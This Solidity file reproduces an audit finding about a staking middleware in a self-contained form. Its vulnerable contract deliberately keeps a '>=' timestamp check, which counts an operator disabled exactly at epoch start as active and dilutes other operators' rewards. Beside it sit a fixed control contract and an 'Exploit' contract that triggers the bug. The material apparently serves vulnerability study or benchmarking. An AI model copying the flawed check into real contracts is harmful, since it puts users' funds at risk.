// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

/*
 * Synthetic, self-contained reproduction of AuditVault finding 61235:
 *   "Timestamp boundary condition causes reward dilution for active operators"
 *   (Suzaku Core, Cyfrin 2025-07-07)
 *
 * Root cause: AvalancheL1Middleware._wasActiveAt() uses `disabledTime >= timestamp`
 * instead of `> timestamp`. An operator disabled at the EXACT epoch-start timestamp
 * is still counted as active, inflating totalStake in calcAndCacheStakes(). The
 * inflated total dilutes the reward share of genuinely-active operators; the diluted
 * (lost) portion stays stuck in the Rewards contract.
 *
 * The vulnerable functions below are inlined VERBATIM from the finding (adapted only
 * to plain arrays for the enumerable-set helpers). The buggy comparison is marked @>.
 */

// --- Minimal marker ERC20 (records harm magnitude) ---
contract MiniToken {
    string public name = "MARKER";
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// --- Vulnerable middleware (faithful minimal double) ---
contract AvalancheL1Middleware {
    // operator registry with enable/disable times
    address[] internal operators;
    mapping(address => uint48) public enabledTimeOf;
    mapping(address => uint48) public disabledTimeOf;
    mapping(address => uint256) public registeredStake;

    // reward-accounting caches (verbatim names from finding)
    mapping(uint48 => mapping(uint96 => mapping(address => uint256))) public operatorStakeCache;
    mapping(uint48 => mapping(uint96 => uint256)) public totalStakeCache;
    mapping(uint48 => mapping(uint96 => bool)) public totalStakeCached;

    uint48 public epochStartTsValue;

    function registerOperator(address operator, uint48 enabledTime, uint48 disabledTime, uint256 stake) external {
        operators.push(operator);
        enabledTimeOf[operator] = enabledTime;
        disabledTimeOf[operator] = disabledTime;
        registeredStake[operator] = stake;
    }

    function setEpochStartTs(uint48 ts) external {
        epochStartTsValue = ts;
    }

    function getEpochStartTs(uint48) public view returns (uint48) {
        return epochStartTsValue;
    }

    // VERBATIM vulnerable boundary check from the finding
    function _wasActiveAt(uint48 enabledTime, uint48 disabledTime, uint48 timestamp) private pure returns (bool) {
        return enabledTime != 0 && enabledTime <= timestamp && (disabledTime == 0 || disabledTime >= timestamp); // @> `>=` counts an operator disabled exactly at `timestamp` as still active
    }

    function getOperatorStake(address operator, uint48, uint96) public view returns (uint256 stake) {
        // simplified: returns the operator's registered stake for the epoch
        return registeredStake[operator];
    }

    // VERBATIM (structure) reward-stake caching from the finding
    function calcAndCacheStakes(uint48 epoch, uint96 assetClassId) public returns (uint256 totalStake) {
        uint48 epochStartTs = getEpochStartTs(epoch);
        uint256 length = operators.length;

        for (uint256 i; i < length; ++i) {
            address operator = operators[i];
            uint48 enabledTime = enabledTimeOf[operator];
            uint48 disabledTime = disabledTimeOf[operator];
            if (!_wasActiveAt(enabledTime, disabledTime, epochStartTs)) { // disabled-at-boundary operator is NOT skipped
                continue;
            }
            uint256 operatorStake = getOperatorStake(operator, epoch, assetClassId);
            operatorStakeCache[epoch][assetClassId][operator] = operatorStake;
            totalStake += operatorStake; // inflated: includes stake of operator disabled at boundary
        }
        totalStakeCache[epoch][assetClassId] = totalStake;
        totalStakeCached[epoch][assetClassId] = true;
    }
}

// --- Fixed middleware (control): `>` instead of `>=` ---
contract AvalancheL1MiddlewareFixed {
    address[] internal operators;
    mapping(address => uint48) public enabledTimeOf;
    mapping(address => uint48) public disabledTimeOf;
    mapping(address => uint256) public registeredStake;

    mapping(uint48 => mapping(uint96 => mapping(address => uint256))) public operatorStakeCache;
    mapping(uint48 => mapping(uint96 => uint256)) public totalStakeCache;

    uint48 public epochStartTsValue;

    function registerOperator(address operator, uint48 enabledTime, uint48 disabledTime, uint256 stake) external {
        operators.push(operator);
        enabledTimeOf[operator] = enabledTime;
        disabledTimeOf[operator] = disabledTime;
        registeredStake[operator] = stake;
    }

    function setEpochStartTs(uint48 ts) external {
        epochStartTsValue = ts;
    }

    function getEpochStartTs(uint48) public view returns (uint48) {
        return epochStartTsValue;
    }

    function _wasActiveAt(uint48 enabledTime, uint48 disabledTime, uint48 timestamp) private pure returns (bool) {
        return enabledTime != 0 && enabledTime <= timestamp && (disabledTime == 0 || disabledTime > timestamp); // FIX
    }

    function getOperatorStake(address operator, uint48, uint96) public view returns (uint256 stake) {
        return registeredStake[operator];
    }

    function calcAndCacheStakes(uint48 epoch, uint96 assetClassId) public returns (uint256 totalStake) {
        uint48 epochStartTs = getEpochStartTs(epoch);
        uint256 length = operators.length;
        for (uint256 i; i < length; ++i) {
            address operator = operators[i];
            uint48 enabledTime = enabledTimeOf[operator];
            uint48 disabledTime = disabledTimeOf[operator];
            if (!_wasActiveAt(enabledTime, disabledTime, epochStartTs)) {
                continue;
            }
            uint256 operatorStake = getOperatorStake(operator, epoch, assetClassId);
            operatorStakeCache[epoch][assetClassId][operator] = operatorStake;
            totalStake += operatorStake;
        }
        totalStakeCache[epoch][assetClassId] = totalStake;
    }
}

// --- Rewards: share = operatorStake / totalStake * totalRewards ---
contract Rewards {
    uint256 public constant BASIS_POINTS_DENOMINATOR = 10_000;

    function operatorReward(uint256 operatorStake, uint256 totalStake, uint256 totalRewards)
        external
        pure
        returns (uint256)
    {
        if (totalStake == 0) return 0;
        // mirrors Rewards._calculateOperatorShare: share = operatorStake/totalStake
        uint256 shareBps = (operatorStake * BASIS_POINTS_DENOMINATOR) / totalStake;
        return (totalRewards * shareBps) / BASIS_POINTS_DENOMINATOR;
    }
}

contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    address internal constant ALICE = address(uint160(0xA11CE)); // disabled at boundary
    address internal constant CHARLIE = address(uint160(0xC4A711E)); // active

    uint96 internal constant ASSET_CLASS = 1;
    uint48 internal constant EPOCH = 7;
    uint48 internal constant EPOCH_START_TS = 1000;

    uint256 public constant STAKE = 100 ether;
    uint256 public constant TOTAL_REWARDS = 100 ether;

    // results
    uint256 public totalStakeBuggy;
    uint256 public charlieRewardBuggy;
    uint256 public charlieRewardCorrect;
    uint256 public lostReward;

    function run() external payable {
        // Deterministic helper creation order (unconditional, at top):
        AvalancheL1Middleware middleware = new AvalancheL1Middleware(); // nonce 1
        Rewards rewards = new Rewards(); // nonce 2
        MiniToken marker = new MiniToken(); // nonce 3

        // Preconditions: two operators, each active since long ago with equal stake.
        middleware.setEpochStartTs(EPOCH_START_TS);
        // Alice disabled EXACTLY at epoch start -> boundary condition.
        middleware.registerOperator(ALICE, 100, EPOCH_START_TS, STAKE);
        // Charlie stays active (disabledTime == 0).
        middleware.registerOperator(CHARLIE, 100, 0, STAKE);

        // Trigger the vulnerable reward-stake caching.
        totalStakeBuggy = middleware.calcAndCacheStakes(EPOCH, ASSET_CLASS);

        uint256 charlieStake = middleware.operatorStakeCache(EPOCH, ASSET_CLASS, CHARLIE);

        // Charlie's reward with the inflated (buggy) total stake.
        charlieRewardBuggy = rewards.operatorReward(charlieStake, totalStakeBuggy, TOTAL_REWARDS);

        // Correct reward: only Charlie is truly active, so total == charlieStake.
        charlieRewardCorrect = rewards.operatorReward(charlieStake, charlieStake, TOTAL_REWARDS);

        // Harm: the diluted (lost) reward that stays stuck instead of reaching Charlie.
        lostReward = charlieRewardCorrect - charlieRewardBuggy;

        // Record harm magnitude in the marker token at SINK.
        marker.mint(SINK, lostReward);
    }
}
